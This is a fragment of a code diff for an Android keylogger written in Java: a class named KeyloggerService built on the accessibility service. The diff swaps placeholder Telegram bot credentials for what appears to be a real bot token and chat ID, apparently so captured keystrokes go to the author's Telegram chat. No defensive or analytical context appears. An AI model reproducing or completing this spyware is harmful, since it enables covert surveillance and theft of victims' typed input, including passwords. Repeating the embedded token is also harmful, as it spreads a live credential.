@@ -8,8 +8,8 @@ import java.net.URL;
 import java.net.URLEncoder;
 
 public class KeyloggerService extends AccessibilityService {
-    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN"; // غيرها
-    private static final String CHAT_ID = "YOUR_CHAT_ID";     // غيرها
+    private static final String BOT_TOKEN = "9014559285:AAEamXnqANi68FHT7mnT3DpF5hC1y9zmes4"; // غيرها
+    private static final String CHAT_ID = "6978974735";     // غيرها
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
